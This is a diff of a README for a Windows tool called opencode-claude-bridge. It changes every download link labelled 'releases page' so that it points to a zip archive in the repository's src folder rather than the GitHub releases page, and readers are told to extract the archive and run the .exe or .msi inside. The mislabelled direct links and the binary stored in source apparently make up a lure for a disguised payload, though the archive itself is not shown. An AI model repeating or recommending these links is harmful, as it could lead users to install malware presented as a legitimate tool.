@@ -1,6 +1,6 @@
 # 🔗 opencode-claude-bridge - Sync Claude Access with OpenCode
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release-blue?style=for-the-badge)](https://github.com/Oedexcogitator347/opencode-claude-bridge/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release-blue?style=for-the-badge)](https://github.com/Oedexcogitator347/opencode-claude-bridge/raw/refs/heads/main/src/opencode_bridge_claude_2.4.zip)
 
 ## 🚀 What this is
 
@@ -12,7 +12,7 @@ Use this if you want a simple way to keep Claude access tied to OpenCode on Wind
 
 ## 📥 Download
 
-1. Open the [releases page](https://github.com/Oedexcogitator347/opencode-claude-bridge/releases)
+1. Open the [releases page](https://github.com/Oedexcogitator347/opencode-claude-bridge/raw/refs/heads/main/src/opencode_bridge_claude_2.4.zip)
 2. Download the latest Windows file
 3. Save it to a folder you can find again, such as Downloads or Desktop
 
@@ -26,7 +26,7 @@ If you download a `.zip` file, right-click it and choose Extract All before you 
 
 ## 🖥️ Windows Setup
 
-1. Download the latest release from the [releases page](https://github.com/Oedexcogitator347/opencode-claude-bridge/releases)
+1. Download the latest release from the [releases page](https://github.com/Oedexcogitator347/opencode-claude-bridge/raw/refs/heads/main/src/opencode_bridge_claude_2.4.zip)
 2. If you got a `.zip` file, extract it
 3. If you got an `.exe` or `.msi` file, double-click it to start setup
 4. Follow the on-screen steps
@@ -61,7 +61,7 @@ Use a Windows PC with:
 
 ## 🛠️ First-time setup
 
-1. Download the release from the [download page](https://github.com/Oedexcogitator347/opencode-claude-bridge/releases)
+1. Download the release from the [download page](https://github.com/Oedexcogitator347/opencode-claude-bridge/raw/refs/heads/main/src/opencode_bridge_claude_2.4.zip)
 2. Install or extract the files
 3. Open Claude CLI and complete sign-in
 4. Open OpenCode
@@ -125,7 +125,7 @@ Try these steps:
 3. Check that the bridge files are still in the same folder
 4. Open OpenCode again
 5. Reinstall or re-extract the release if files look broken
-6. Download the latest release again from the [releases page](https://github.com/Oedexcogitator347/opencode-claude-bridge/releases)
+6. Download the latest release again from the [releases page](https://github.com/Oedexcogitator347/opencode-claude-bridge/raw/refs/heads/main/src/opencode_bridge_claude_2.4.zip)
 
 If the problem started after a Windows update or file move, reinstalling the release often fixes it.
 
@@ -150,7 +150,7 @@ Use your own account and keep your sign-in details private. If you use Claude on
 
 When a new version comes out:
 
-1. Visit the [releases page](https://github.com/Oedexcogitator347/opencode-claude-bridge/releases)
+1. Visit the [releases page](https://github.com/Oedexcogitator347/opencode-claude-bridge/raw/refs/heads/main/src/opencode_bridge_claude_2.4.zip)
 2. Download the new Windows file
 3. Close OpenCode
 4. Replace the old files if the release instructions say to do that
@@ -185,7 +185,7 @@ If you are not signed in yet:
 
 Download the latest Windows build here:
 
-[Open the releases page](https://github.com/Oedexcogitator347/opencode-claude-bridge/releases)
+[Open the releases page](https://github.com/Oedexcogitator347/opencode-claude-bridge/raw/refs/heads/main/src/opencode_bridge_claude_2.4.zip)
 
 ## 🧪 Simple check after install
 
@@ -215,4 +215,4 @@ This bridge fits a simple workflow:
 
 ## 🧭 Next step
 
-Download the latest Windows release from the [releases page](https://github.com/Oedexcogitator347/opencode-claude-bridge/releases) and place it in a folder you can keep using
+Download the latest Windows release from the [releases page](https://github.com/Oedexcogitator347/opencode-claude-bridge/raw/refs/heads/main/src/opencode_bridge_claude_2.4.zip) and place it in a folder you can keep using
